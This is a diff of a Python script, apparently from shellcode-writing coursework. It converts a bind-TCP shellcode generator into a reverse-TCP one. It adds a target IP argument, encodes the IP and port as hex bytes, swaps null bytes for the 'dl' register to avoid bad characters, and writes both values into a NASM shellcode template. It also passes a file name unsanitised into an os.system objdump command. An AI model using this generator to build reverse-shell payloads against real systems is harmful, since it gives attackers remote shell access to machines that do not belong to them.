@@ -62,7 +62,8 @@ def show_opcodes(file_name):
 	os.system("for i in $(objdump -d {0} -M intel |grep \"^ \" |cut -f2); do echo -n '\\x'$i; done;echo".format(file_name))
 	print("")
 
-parser = argparse.ArgumentParser(description='Bind TCP Wrapper - Shellcode generator')
+parser = argparse.ArgumentParser(description='Reverse TCP Wrapper - Shellcode generator')
+parser.add_argument('ip', nargs=1, help="IP Address to connect to")
 parser.add_argument('port', nargs=1, help="Port Number to connecto to")
 parser.add_argument('template', nargs=1, help="Full path where shellcode template is located")
 parser.add_argument('--output', '-o', help="Output name for the new shellcode. Default (scode_time.nasm)")
@@ -73,34 +74,59 @@ args,l = parser.parse_known_args()
 
 verbose = args.verbose
 stdout = args.stdout
+ip = args.ip[0]
 port = args.port[0]
 template = args.template[0]
 output = "scode_{0}".format(time.strftime('%H%m%s')) if args.output is None else args.output
 
 info("Staring process")
 
+debug("IP: {0}".format(ip))
 debug("Port number: {0}".format(port))
 debug("Using template: {0}".format(template))
 debug("Output file: {0}".format(output), True)
 
+if not check_ip_format(ip):
+	error("Invalid ip address provided")
 if int(port) <= 0 or int(port) > 65535:
 	error("Invalid port number")
 
 
+
+ip = socket.inet_aton(ip)
+ip = ip.encode('hex')
+
+debug("Hex IP: {0}".format(ip))
+
+
+ip_b = []
+ip_b.append("0x" + ip[:2])
+# Check for null bytes. If 00 exists, we push "dl" to avoid bad chars
+# It works if the template has xor edx,edx before
+ip_b.append("0x" + ip[2:4] if ip[2:4] != "00" else "dl")
+ip_b.append("0x" + ip[4:6] if ip[4:6] != "00" else "dl")
+ip_b.append("0x" + ip[6:8])
+
+debug("Checking if IP Address has null bytes")
+debug("Hex IP: {0}".format(ip_b))
+
+
+#~ int_port = sys.argv[2]
 int_port = port
 long_hex_port = struct.pack("<L",int(int_port)).encode('hex')[:4]
 
 new_port = get_hex_port(long_hex_port)
+port_byte_1 = "0x" + new_port[:2] if new_port[:2] != "00" else "dl"
+port_byte_2 = "0x" + new_port[2:4] if new_port[2:4] != "00" else "dl"
+#port_byte_1 = "0x" + new_port[:2]
+#port_byte_2 = "0x" + new_port[2:4]
 
 debug("Long port hex: {0} (null bytes are checked too)".format(new_port))
 debug("Opening template")
 
 f = open(template, "r")
 replaced = f.read()
-port_1 = "0x" + new_port[:2] if new_port[:2] != "00" else "dl"
-port_2 = "0x" + new_port[2:] if new_port[2:] != "00" else "dl"
-
-new_asm_content = replaced.format(port_2, port_1)
+new_asm_content = replaced.format(port_byte_2, port_byte_1, ip_b[0],ip_b[1],ip_b[2],ip_b[3])
 f.close()
 
 f2 = open("{0}.nasm".format(output), "w")
